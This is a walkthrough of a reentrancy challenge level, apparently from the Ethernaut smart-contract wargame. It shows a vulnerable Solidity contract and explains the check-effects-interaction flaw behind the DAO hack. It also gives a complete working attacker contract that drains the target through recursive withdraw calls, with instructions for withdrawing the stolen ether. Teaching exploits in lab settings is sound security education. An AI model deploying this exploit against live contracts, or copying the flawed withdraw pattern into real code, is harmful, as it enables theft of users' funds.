# 10. Re-entrency

The goal of this level is for you to steal all the funds from the contract.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

## Vulnerability

This contract does not respect the CHECK - EFFECT - INTERACTION pattern. EFFECT `balances[msg.sender] -= _amount;` happens after INTERACTION ` (bool result,) = msg.sender.call{value:_amount}("");`. It is possible to design a smart contract calling that function recursively to drain all funds from the target contract.
This attack is exactly what happen during the infamous DAO hack.

This can be done with the following contract :

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Reentrency {

    address owner;
    address targetContract;
    uint256 withdrawAmount;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(address _targetContract) payable {
        require(msg.value >= 0.1 ether);

        owner = msg.sender;
        targetContract = _targetContract;
        withdrawAmount = msg.value;
        (bool success, ) = targetContract.call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));

        require(success);
    }

    function attack(uint256 amount) public {
        (bool success, ) = targetContract.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(success);
    }

    function withdraw() onlyOwner() public {
        (bool success, ) = owner.call{value: address(this).balance}("");
        require (success);
    }

    receive() external payable {
        if (targetContract.balance == 0) {
            return;
        }

        uint256 toWithdraw = targetContract.balance > withdrawAmount ? withdrawAmount : targetContract.balance;
        attack(toWithdraw);
    }
}
```

Just make sure to call `attack` with a high enough gas limit and a `value` <= to your initial deposit. When the attack is done, you can withdraw the stolen funds by calling the `withdraw`.